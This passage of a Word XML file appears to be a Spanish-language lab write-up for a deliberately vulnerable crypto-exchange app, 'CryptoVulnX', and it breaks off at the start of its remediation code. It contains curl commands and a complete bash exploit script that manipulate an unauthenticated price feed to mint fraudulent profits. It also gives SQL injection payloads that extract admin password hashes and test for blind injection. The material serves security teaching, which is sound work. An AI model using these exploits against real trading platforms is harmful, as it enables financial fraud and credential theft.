      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Verificar saldo</w:t>
        <w:br/>
        <w:t>curl -s http://localhost/appsec/api/v1/wallet/balance.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balances": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "USDT": "5000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "0.00000000"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Manipular el precio de BTC a $0.01 (simulando un feed externo comprometido).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"rates":{"BTC":"0.01"}}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Precios actualizados",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "updated_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "0.01"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "previous_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "67542.50"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Comprar BTC al precio manipulado de $0.01.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"USDT","to":"BTC","amount":5000}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "swap": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "from": "USDT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "to": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_sent": "5000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_received": "500000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rate_used": "0.01",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "timestamp": "2026-03-28T14:05:00Z"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Con 5,000 USDT compramos 500,000 BTC (a $0.01 cada uno).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 5</w:t>
      </w:r>
      <w:r>
        <w:t>: Restaurar el precio original de BTC.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"rates":{"BTC":"67542.50"}}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Precios actualizados",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "updated_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "67542.50"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  },</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "previous_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "0.01"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 6</w:t>
      </w:r>
      <w:r>
        <w:t>: Vender BTC al precio real para materializar las ganancias.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"BTC","to":"USDT","amount":500000}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "swap": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "from": "BTC",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "to": "USDT",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_sent": "500000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "amount_received": "33771250000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "rate_used": "67542.50",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "timestamp": "2026-03-28T14:06:00Z"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 7</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar el saldo final.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s http://localhost/appsec/api/v1/wallet/balance.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "balances": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "USDT": "33771250000.00",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "0.00000000"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Resultado</w:t>
      </w:r>
      <w:r>
        <w:t>: Inversion de 5,000 USDT convertida en 33,771,250,000 USDT (mas de 33 mil millones).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion 2: Inyeccion SQL a traves del Feed de Precios</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 1</w:t>
      </w:r>
      <w:r>
        <w:t>: Inyectar SQL a traves del campo de precio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "{\"rates\":{\"BTC\":\"1' OR '1'='1\"}}"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada (si el servidor es vulnerable):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Precios actualizados",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "updated_rates": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "BTC": "1' OR '1'='1"</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 2</w:t>
      </w:r>
      <w:r>
        <w:t>: Verificar el efecto de la inyeccion cuando el swap consulta el precio.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/crypto/swap.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"USDT","to":"BTC","amount":100}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada (error SQL expuesto):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Database error",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "debug": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "sql_error": "You have an error in your SQL syntax...",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "sql_query": "SELECT price FROM crypto_prices WHERE symbol = 'BTC' AND price = '1' OR '1'='1'",</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "error_code": 1064</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 3</w:t>
      </w:r>
      <w:r>
        <w:t>: Intentar inyecciones mas sofisticadas para extraer datos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Inyeccion UNION para extraer credenciales de la tabla users</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "{\"rates\":{\"BTC\":\"1' UNION SELECT password_hash FROM users WHERE role='admin' -- \"}}"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Paso 4</w:t>
      </w:r>
      <w:r>
        <w:t>: Intentar inyeccion basada en tiempo para confirmar la vulnerabilidad.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Inyeccion basada en tiempo</w:t>
        <w:br/>
        <w:t>curl -s -X POST http://localhost/appsec/api/internal/rates.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "{\"rates\":{\"BTC\":\"1'; SELECT SLEEP(5); -- \"}}"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Si el servidor tarda 5 segundos en responder, confirma la inyeccion SQL ciega.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Script Completo de Explotacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># exploit_unsafe_consumption.sh</w:t>
        <w:br/>
        <w:t># Demuestra la cadena completa de explotacion: feed comprometido -&gt; swap fraudulento</w:t>
        <w:br/>
        <w:br/>
        <w:t>BASE="http://localhost/appsec"</w:t>
        <w:br/>
        <w:t>RATES_URL="$BASE/api/internal/rates.php"</w:t>
        <w:br/>
        <w:t>SWAP_URL="$BASE/api/v1/crypto/swap.php"</w:t>
        <w:br/>
        <w:t>BALANCE_URL="$BASE/api/v1/wallet/balance.php"</w:t>
        <w:br/>
        <w:t>LOGIN_URL="$BASE/api/v1/auth/login.php"</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo "============================================"</w:t>
        <w:br/>
        <w:t>echo " CryptoVulnX - Unsafe API Consumption Exploit"</w:t>
        <w:br/>
        <w:t>echo "============================================"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 1. Login</w:t>
        <w:br/>
        <w:t>echo -e "\n[1] Autenticando..."</w:t>
        <w:br/>
        <w:t>TOKEN=$(curl -s -X POST "$LOGIN_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"attacker@test.com","password":"password123"}' | \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  python -c "import sys,json; print(json.load(sys.stdin)['token'])")</w:t>
        <w:br/>
        <w:t>echo "    Token obtenido: ${TOKEN:0:20}..."</w:t>
        <w:br/>
        <w:br/>
        <w:t># 2. Saldo inicial</w:t>
        <w:br/>
        <w:t>echo -e "\n[2] Saldo inicial:"</w:t>
        <w:br/>
        <w:t>curl -s "$BALANCE_URL" -H "Authorization: Bearer $TOKEN" | python -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t># 3. Precio original</w:t>
        <w:br/>
        <w:t>echo -e "\n[3] Precio original de BTC:"</w:t>
        <w:br/>
        <w:t>ORIGINAL_PRICE=$(curl -s "$RATES_URL" | python -c "import sys,json; print(json.load(sys.stdin)['rates']['BTC'])")</w:t>
        <w:br/>
        <w:t>echo "    BTC = \$$ORIGINAL_PRICE"</w:t>
        <w:br/>
        <w:br/>
        <w:t># 4. Manipular precio</w:t>
        <w:br/>
        <w:t>echo -e "\n[4] Manipulando precio de BTC a \$0.01..."</w:t>
        <w:br/>
        <w:t>curl -s -X POST "$RATES_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"rates":{"BTC":"0.01"}}' | python -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t># 5. Comprar BTC barato</w:t>
        <w:br/>
        <w:t>echo -e "\n[5] Comprando BTC al precio manipulado..."</w:t>
        <w:br/>
        <w:t>curl -s -X POST "$SWAP_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"USDT","to":"BTC","amount":5000}' | python -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t># 6. Restaurar precio</w:t>
        <w:br/>
        <w:t>echo -e "\n[6] Restaurando precio original de BTC a \$$ORIGINAL_PRICE..."</w:t>
        <w:br/>
        <w:t>curl -s -X POST "$RATES_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d "{\"rates\":{\"BTC\":\"$ORIGINAL_PRICE\"}}" | python -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t># 7. Vender BTC al precio real</w:t>
        <w:br/>
        <w:t>echo -e "\n[7] Vendiendo BTC al precio real..."</w:t>
        <w:br/>
        <w:t>curl -s -X POST "$SWAP_URL" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer $TOKEN" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"from":"BTC","to":"USDT","amount":500000}' | python -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t># 8. Saldo final</w:t>
        <w:br/>
        <w:t>echo -e "\n[8] Saldo final:"</w:t>
        <w:br/>
        <w:t>curl -s "$BALANCE_URL" -H "Authorization: Bearer $TOKEN" | python -m json.tool</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo -e "\n[*] Explotacion completada."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Validar y Sanitizar Datos de APIs Externas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;?php</w:t>
        <w:br/>
        <w:t>// helpers/external_data_validator.php</w:t>
        <w:br/>
        <w:br/>
        <w:t>/**</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * Valida los datos recibidos de APIs externas con el mismo rigor</w:t>
        <w:br/>
        <w:t xml:space="preserve"> * que se aplica a los datos de usuario.</w:t>
        <w:br/>
        <w:t xml:space="preserve"> */</w:t>
        <w:br/>
        <w:t>class ExternalDataValidator {</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    /**</w:t>
        <w:br/>
        <w:t xml:space="preserve">     * Valida un precio de criptomoneda recibido de un feed externo.</w:t>
        <w:br/>
        <w:t xml:space="preserve">     */</w:t>
        <w:br/>
        <w:t xml:space="preserve">    public static function validateCryptoPrice(string $symbol, $price): float {</w:t>
        <w:br/>
        <w:t xml:space="preserve">        // 1. Verificar que es numerico</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if (!is_numeric($price)) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            throw new InvalidArgumentException(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "Precio invalido para $symbol: no es numerico"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        $price = (float)$price;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // 2. Verificar que es positivo</w:t>
        <w:br/>
        <w:t xml:space="preserve">        if ($price &lt;= 0) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">            throw new InvalidArgumentException(</w:t>
        <w:br/>
        <w:t xml:space="preserve">                "Precio invalido para $symbol: debe ser positivo"</w:t>
        <w:br/>
        <w:t xml:space="preserve">            );</w:t>
        <w:br/>
        <w:t xml:space="preserve">        }</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">        // 3. Verificar rango razonable segun la moneda</w:t>
        <w:br/>
        <w:t xml:space="preserve">        $price_ranges = [</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'BTC' =&gt; ['min' =&gt; 1000, 'max' =&gt; 500000],</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'ETH' =&gt; ['min' =&gt; 100, 'max' =&gt; 50000],</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'SOL' =&gt; ['min' =&gt; 1, 'max' =&gt; 5000],</w:t>
        <w:br/>
        <w:t xml:space="preserve">            'ADA' =&gt; ['min' =&gt; 0.01, 'max' =&gt; 100],</w:t>
        <w:br/>
